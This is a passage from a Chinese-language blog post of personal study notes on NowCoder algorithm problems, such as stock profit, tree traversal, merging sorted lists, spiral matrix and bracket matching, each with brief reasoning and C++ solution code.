class="line">        &#125;</span><br><span class="line">        ListNode* nextNode = head-&gt;next;</span><br><span class="line">        head-&gt;next = head;</span><br><span class="line">        <span class="keyword">return</span> hasCycle(nextNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC7-股票（一次交易）"><a href="#NC7-股票（一次交易）" class="headerlink" title="NC7 股票（一次交易）"></a>NC7 股票（一次交易）</h2><blockquote>
<p>其本质是寻找上界和下界，但下界必须在上界之后。</p>
<p>所以就是最大最小值，但是找到一个最小值后，最大值要初始化，重新寻找这个最小值之后的最大值，这句很有意思。</p>
</blockquote>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param prices int整型vector </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> t_max=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> t_min=prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> profit=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prices.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(t_max &lt; prices[i])&#123;</span><br><span class="line">                t_max = prices[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(t_min &gt; prices[i])&#123;</span><br><span class="line">                t_min = prices[i];</span><br><span class="line">                t_max=<span class="number">-1</span>;<span class="comment">//确保t_max是再t_min之后</span></span><br><span class="line">            &#125;</span><br><span class="line">            profit=<span class="built_in">max</span>(profit,t_max-t_min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC13-二叉树的最大深度"><a href="#NC13-二叉树的最大深度" class="headerlink" title="NC13 二叉树的最大深度"></a>NC13 二叉树的最大深度</h2><blockquote>
<p>emmm,使用递归方法解决。</p>
<p>1.如果当前root为nullptr了，那么为0层，直接返回</p>
<p>2.否则的话，分别从左节点和右节点深入下去，且层数加1</p>
<p>其实是个非常简单的递归</p>
</blockquote>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *	int val;</span></span><br><span class="line"><span class="comment"> *	struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *	struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param root TreeNode类 </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(maxDepth(root-&gt;left),maxDepth(root-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC19-子数组的最大累加和的问题"><a href="#NC19-子数组的最大累加和的问题" class="headerlink" title="NC19 子数组的最大累加和的问题"></a>NC19 子数组的最大累加和的问题</h2><blockquote>
<p>求数组的最大累计和。。。</p>
<p>方法是动态规划。有点迷，只意会了，</p>
<p><img src="/2021/04/18/08-14/image-20210414203852286.png" alt="image-20210414203852286"></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * max sum of the subarray</span></span><br><span class="line"><span class="comment">     * @param arr int整型vector the array</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxsumofSubarray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> arr[<span class="number">0</span>];<span class="comment">//确定的情况，直接返回结果</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;arr.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            arr[i]=<span class="built_in">max</span>(arr[i],arr[i<span class="number">-1</span>]+arr[i]);<span class="comment">//求第i位的最大值</span></span><br><span class="line">            ans=<span class="built_in">max</span>(ans,arr[i]);<span class="comment">//求累计最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC22-合并两个有序的数组"><a href="#NC22-合并两个有序的数组" class="headerlink" title="NC22 合并两个有序的数组"></a>NC22 合并两个有序的数组</h2><blockquote>
<p>将b数组合并到a中，，，其实很简单，但是这个代码非常简介，，，<strong>使用—</strong></p>
</blockquote>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> m, <span class="keyword">int</span> B[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=m<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> j=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> index = m+n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>)</span><br><span class="line">            A[index--]=A[i]&gt;B[j]?A[i--]:B[j--];</span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">0</span>)</span><br><span class="line">            A[index--]=B[j--];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC33-合并有序链表"><a href="#NC33-合并有序链表" class="headerlink" title="NC33 合并有序链表"></a>NC33 合并有序链表</h2><blockquote>
<p>一个重点是，，，一开始res必须初始化，否则别的添加不进来。</p>
<p><strong>还有注意直接返回的简单情况，，，做优化</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *	int val;</span></span><br><span class="line"><span class="comment"> *	struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param l1 ListNode类 </span></span><br><span class="line"><span class="comment">     * @param l2 ListNode类 </span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">nullptr</span>) <span class="keyword">return</span> l2;</span><br><span class="line">        <span class="keyword">if</span>(l2==<span class="literal">nullptr</span>) <span class="keyword">return</span> l1;</span><br><span class="line">        ListNode *res=<span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode *current=res;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">nullptr</span> &amp;&amp; l2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt;= l2-&gt;val)&#123;</span><br><span class="line">                current-&gt;next = l1;</span><br><span class="line">                current=current-&gt;next;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                current-&gt;next = l2;</span><br><span class="line">                current=current-&gt;next;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            current-&gt;next = l1;</span><br><span class="line">            current=current-&gt;next;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            current-&gt;next = l2;javascript:<span class="keyword">void</span>(<span class="number">0</span>);</span><br><span class="line">            current=current-&gt;next;</span><br><span class="line">            l2=l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC38-螺旋矩阵"><a href="#NC38-螺旋矩阵" class="headerlink" title="NC38 螺旋矩阵"></a>NC38 螺旋矩阵</h2><blockquote>
<p>这道题在之前校赛（蓝桥杯）的时候没又做出来，，，<del>原来是个经典算法，tat</del></p>
<p>思路：</p>
<p>使用四个变量：<code>up、r、down、l</code> 来固定四个变，然后依次遍历，，，太容易弄错了，苦苦</p>
</blockquote>
<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><h3 id="初始化大小并赋值"><a href="#初始化大小并赋值" class="headerlink" title="初始化大小并赋值"></a>初始化大小并赋值</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>,<span class="number">1</span>)</span></span>; <span class="comment">//定义了10个整型元素的向量,且给出每个元素的初值为1</span></span><br></pre></td></tr></table></figure>
<h4 id="二维数组初始化："><a href="#二维数组初始化：" class="headerlink" title="二维数组初始化："></a>二维数组初始化：</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">spiralOrder</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;matrix)</span></span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(matrix.empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> up=<span class="number">0</span>,down=matrix.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=matrix[<span class="number">0</span>].<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r ; ++i) res.push_back(matrix[up][i]);</span><br><span class="line">            <span class="keyword">if</span>(++up &gt; down) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down ; ++i) res.push_back(matrix[i][r]);</span><br><span class="line">            <span class="keyword">if</span>(--r &lt; l) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = r; i &gt;= l ; --i) res.push_back(matrix[down][i]);</span><br><span class="line">            <span class="keyword">if</span>(--down &lt; up) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up ; --i) res.push_back(matrix[i][l]);</span><br><span class="line">            <span class="keyword">if</span>(++l &gt; r) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;&#125;;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans = s.spiralOrder(v);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ans.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="NC41-找到字符串的最长无重复字符子串"><a href="#NC41-找到字符串的最长无重复字符子串" class="headerlink" title="NC41 找到字符串的最长无重复字符子串"></a>NC41 找到字符串的最长无重复字符子串</h2><h3 id="快速读入方法"><a href="#快速读入方法" class="headerlink" title="快速读入方法"></a>快速读入方法</h3><blockquote>
<p>一个静态方法，，，只要有就可以了。</p>
<p>实现空间换时间。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">auto</span> io_sync_off = []()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.tie(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目解释：在一个int型数组中，找到一段连续的最大不重复的数组长度（这段数组连续）。</p>
<p>方法：</p>
<ol>
<li><p>设置三个变量，i、j、res。</p>
<p>i是这段的第一个</p>
<p>j是这段的第二个</p>
<p>res是长度值</p>
</li>
<li><p>因为不重复，，，结束就在两个重复的元素，一旦找到当前重复了，之前的长度就是这段的长度，就一段一段算。</p>
</li>
</ol>
<p>例1：1 2 3 2 6数组，答案是3。</p>
<ul>
<li>起始地址初始为arr[0]，即1，故一直循环到1 2 3 2，最大不重复数组长度为长度为3。这时候发现有重复，即开始这个和到现在指向的一段里面有重复元素，故将起始地址换为下一个；</li>
<li>起始地址变为arr[1]，即从2开始，2 3 2，发现又有重复，起始地址继续换为下一个。</li>
<li>3 2 6到达数组尾端，长度为3</li>
<li>故最大值，最后结果为3。</li>
</ul>
<p>例2：1 2 1 2 6数组，答案是3。</p>
<ul>
<li>首先1 2 1，长度为2，重复</li>
<li>然后2 1 2，长度为2，重复</li>
<li>然后1 2 6，长度为3</li>
<li>故最后取值最大为3。</li>
</ul>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">auto</span> io_sync_off = []()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.tie(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param arr int整型vector the array</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxLength</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(arr.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;v(<span class="number">100000</span>);</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>,i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;arr.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span>(v[arr[j]]==<span class="number">0</span>)&#123;</span><br><span class="line">                v[arr[j]]=<span class="number">1</span>;</span><br><span class="line">                res=<span class="built_in">max</span>(res,j-i+<span class="number">1</span>);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                v[arr[i]]=<span class="number">0</span>;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC45-实现二叉树先序，中序和后序遍历"><a href="#NC45-实现二叉树先序，中序和后序遍历" class="headerlink" title="NC45 实现二叉树先序，中序和后序遍历"></a>NC45 实现二叉树先序，中序和后序遍历</h2><h3 id="树节点TreeNode"><a href="#树节点TreeNode" class="headerlink" title="树节点TreeNode"></a>树节点TreeNode</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) :</span><br><span class="line">            val(x), left(<span class="literal">NULL</span>), right(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="先序、中序、后序遍历"><a href="#先序、中序、后序遍历" class="headerlink" title="先序、中序、后序遍历"></a>先序、中序、后序遍历</h3><blockquote>
<ul>
<li>先序：根、左节点、右节点</li>
<li>中序：左节点、跟、右节点</li>
<li>后序：左节点、右节点、跟</li>
</ul>
</blockquote>
<p>先序的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    pre.push_back(root-&gt;val);</span><br><span class="line">    preorder(root-&gt;left);</span><br><span class="line">    preorder(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span>  <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) :</span><br><span class="line">            val(x), left(<span class="literal">NULL</span>), right(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pre,mid,post;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">threeOrders</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> result;</span><br><span class="line">        preorder(root);</span><br><span class="line">        midorder(root);</span><br><span class="line">        postorder(root);</span><br><span class="line">        result=&#123;pre,mid,post&#125;;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        pre.push_back(root-&gt;val);</span><br><span class="line">        preorder(root-&gt;left);</span><br><span class="line">        preorder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">midorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        midorder(root-&gt;left);</span><br><span class="line">        mid.push_back(root-&gt;val);</span><br><span class="line">        midorder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        postorder(root-&gt;left);</span><br><span class="line">        postorder(root-&gt;right);</span><br><span class="line">        post.push_back(root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">TreeNode <span class="title">t1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">TreeNode <span class="title">t2</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="function">TreeNode <span class="title">t3</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    t1.left = &amp;t2;</span><br><span class="line">    t1.right = &amp;t3;</span><br><span class="line"></span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = s.threeOrders(&amp;t1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; v[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;v[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        &#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="NC52括号序列"><a href="#NC52括号序列" class="headerlink" title="NC52括号序列"></a>NC52括号序列</h2><blockquote>
<p><del>eee，没错，，，熟悉的题目，，，以前做过的，，，然后又犯了同样的毛病</del></p>
<p>就是在stack里面没有的时候，查看栈顶数据和pop都会报错，，，，</p>
<p>题解里面有两个比较有意思的解法。</p>
</blockquote>
<h3 id="解法1：压栈和取栈"><a href="#解法1：压栈和取栈" class="headerlink" title="解法1：压栈和取栈"></a>解法1：压栈和取栈</h3><blockquote>
<p>其实和我的思路一样，但是要简单一点，他是把能消除了消掉，不能消掉的就压栈，，，最后判断栈是否为空即可。</p>
</blockquote>
<h4 id="exp1-1"><a href="#exp1-1" class="headerlink" title="exp1"></a>exp1</h4><blockquote>
<p>代码写的特别简洁，xifan</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c.empty())&#123;</span><br><span class="line">                c.push(s[i]);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">')'</span> &amp;&amp; c.top()==<span class="string">'('</span>)&#123;c.pop();&#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'&#125;'</span> &amp;&amp; c.top()==<span class="string">'&#123;'</span>)&#123;c.pop();&#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">']'</span> &amp;&amp; c.top()==<span class="string">'['</span>)&#123;c.pop();&#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;c.push(s[i]);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="解法2：字符替换"><a href="#解法2：字符替换" class="headerlink" title="解法2：字符替换"></a>解法2：字符替换</h3><blockquote>
<p>因为正常的字符串，，，，肯定有(){}[]，可以逐步消，正是模拟这个过程，，，虽然代码很好看，，，但其实效率并不是很好，因为replace内部的实现需要线性</p>
</blockquote>
